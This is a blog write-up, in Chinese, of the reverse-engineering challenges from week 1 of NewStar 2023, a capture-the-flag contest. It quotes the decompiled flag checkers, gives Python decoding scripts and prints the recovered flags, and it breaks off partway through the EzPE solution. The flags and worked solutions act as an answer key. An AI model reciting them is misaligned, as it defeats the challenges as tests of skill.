<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>newstar2023_week1 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="REeasy_RE确实是打开就有
flag&amp;#123;we1c0me_to_rev3rse!!&amp;#125;



elfinputString 先异或然后+16 然后base64encode后和flag cmp，decode后-16 异或就好了
s1 &amp;#x3D; (char *)base64_encode(v6, v3);
  if ( !strcmp(s1, &amp;quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&amp;quot;) )
  
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&amp;#x2F;

_BYTE *__fastcall encode(const char *a1)
&amp;#123;
  size_t v1; &amp;#x2F;&amp;#x2F; rax
  int v2; &amp;#x2F;&amp;#x2F; eax
  _BYTE *v4; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-20h]
  int i; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-18h]
  int v6; &amp;#x2F;&amp;#x2F; [rsp+2Ch] [rbp-14h]

  v1 &amp;#x3D; strlen(a1);
  v4 &amp;#x3D; malloc(2 * v1 + 1);
  v6 &amp;#x3D; 0;
  for ( i &amp;#x3D; 0; i &amp;lt; strlen(a1); ++i )
  &amp;#123;
    v2 &amp;#x3D; v6++;
    v4[v2] &amp;#x3D; (a1[i] ^ 0x20) + 16;
  &amp;#125;
  v4[v6] &amp;#x3D; 0;
  return v4;
&amp;#125;

import base64

def custom_base64_decode(encoded_str):
    custom_base64_chars = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;
    standard_base64_chars = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;
    translation = str.maketrans(custom_base64_chars, standard_base64_chars)
    return base64.b64decode(encoded_str.translate(translation))

def xor(encoded_bytes):
    decoded_chars = []
    for byte in encoded_bytes:
        char = chr((byte - 16) ^ 0x20)
        decoded_chars.append(char)
    return &#39;&#39;.join(decoded_chars)


encoded_str = &#34;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&#34;
print(xor(custom_base64_decode(encoded_str)))

flag&amp;#123;D0_4ou_7now_wha7_ELF_1s?&amp;#125;"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="newstar2023_week1"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> newstar2023_week1</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>确实是打开就有</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;we1c0me_to_rev3rse!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>inputString 先异或然后+16 然后base64encode后和flag cmp，decode后-16 异或就好了</p>
<pre class="line-numbers language-none"><code class="language-none">s1 &#x3D; (char *)base64_encode(v6, v3);
  if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) )
  
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">_BYTE *__fastcall encode(const char *a1)
&#123;
  size_t v1; &#x2F;&#x2F; rax
  int v2; &#x2F;&#x2F; eax
  _BYTE *v4; &#x2F;&#x2F; [rsp+20h] [rbp-20h]
  int i; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
  int v6; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]

  v1 &#x3D; strlen(a1);
  v4 &#x3D; malloc(2 * v1 + 1);
  v6 &#x3D; 0;
  for ( i &#x3D; 0; i &lt; strlen(a1); ++i )
  &#123;
    v2 &#x3D; v6++;
    v4[v2] &#x3D; (a1[i] ^ 0x20) + 16;
  &#125;
  v4[v6] &#x3D; 0;
  return v4;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">custom_base64_decode</span><span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    custom_base64_chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
    standard_base64_chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
    translation <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>custom_base64_chars<span class="token punctuation">,</span> standard_base64_chars<span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encoded_str<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>translation<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>encoded_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    decoded_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> byte <span class="token keyword">in</span> encoded_bytes<span class="token punctuation">:</span>
        char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
        decoded_chars<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decoded_chars<span class="token punctuation">)</span>


encoded_str <span class="token operator">=</span> <span class="token string">"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span>custom_base64_decode<span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h2><p>die查壳是upx4.0.2 , 在这里下载<a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a> </p>
<p>然后upx -d filename 脱壳</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  v4 <span class="token operator">=</span> <span class="token operator">&amp;</span>Str1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>Str1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v4 <span class="token operator">-</span> Str1 <span class="token punctuation">)</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token operator">++</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>Str1<span class="token punctuation">,</span> enc<span class="token punctuation">,</span> v4 <span class="token operator">-</span> Str1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</p>
<p>大概是吧str1全部++了一边 –回去就好了</p>
<pre class="line-numbers language-none"><code class="language-none">flag &#x3D; &quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;
flag &#x3D; [c for c in flag]
for i in range(len(flag)):
    flag[i] &#x3D; chr(ord(flag[i]) - 1)
    print(flag[i] , end&#x3D;&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7 打开段视图，然后拼接flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><p>关键逻辑在这里，能看到长度，还有异或的操作，只需要根据happyx3 还有 cArr置反就能得到inputString</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">Xor</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span> <span class="token class-name">String</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token char">'\r'</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'K'</span><span class="token punctuation">,</span> <span class="token char">'I'</span><span class="token punctuation">,</span> <span class="token char">'7'</span><span class="token punctuation">,</span> <span class="token char">' '</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token char">'I'</span><span class="token punctuation">,</span> <span class="token char">'\n'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'\f'</span><span class="token punctuation">,</span> <span class="token char">'>'</span><span class="token punctuation">,</span> <span class="token char">'('</span><span class="token punctuation">,</span> <span class="token char">'@'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token char">'\''</span><span class="token punctuation">,</span> <span class="token char">'K'</span><span class="token punctuation">,</span> <span class="token char">'Y'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token char">'\r'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> str3 <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">25</span> <span class="token operator">?</span> <span class="token string">"wrong!!!"</span> <span class="token operator">:</span> <span class="token string">"you win!!!"</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">char</span> charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> str2<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">%</span> str2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cArr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> charAt<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>cArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> charAt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token string">"wrong!!!"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> str3<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>mainActivity<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">mainActivity<span class="token punctuation">.</span></span>Xor</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"happyx3"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">str2 <span class="token operator">=</span> <span class="token string">"happyx3"</span>
cArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'\f'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">]</span>

str1 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>cArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cArr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;3z_And0r1d_X0r_x1x1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>这里v5是个指针来的，一开始看有些怪，过一会就懂了。需要再异或一次，然后按字节拆分数字，小端序转大端序就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input your flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> v6<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">!=</span> <span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v5 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you are right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">process_and_combine</span><span class="token punctuation">(</span>hex_values<span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    xor_results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token keyword">for</span> value <span class="token keyword">in</span> hex_values<span class="token punctuation">]</span>

    reversed_strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> xor_result <span class="token keyword">in</span> xor_results<span class="token punctuation">:</span>
        xor_result <span class="token operator">=</span> xor_result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
        result_string <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>xor_result<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        reversed_strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result_string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    combined_string <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reversed_strings<span class="token punctuation">)</span>

   	<span class="token keyword">return</span> combined_string


flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"75553A1E"</span><span class="token punctuation">,</span> <span class="token string">"7B583A03"</span><span class="token punctuation">,</span> <span class="token string">"4D58220C"</span><span class="token punctuation">,</span> <span class="token string">"7B50383D"</span><span class="token punctuation">,</span> <span class="token string">"736B3819"</span><span class="token punctuation">]</span>
inputString <span class="token operator">=</span> process_and_combine<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>inputString<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;llittl_Endian_a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>修复pe头的话，找个exe 010edit从开始到0x70h那一行粘贴一下，就好了</p>
<p>异或置反一下就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> 
    <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> 
    <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> 
    <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x7D</span>
<span class="token punctuation">]</span>

input_recovered <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
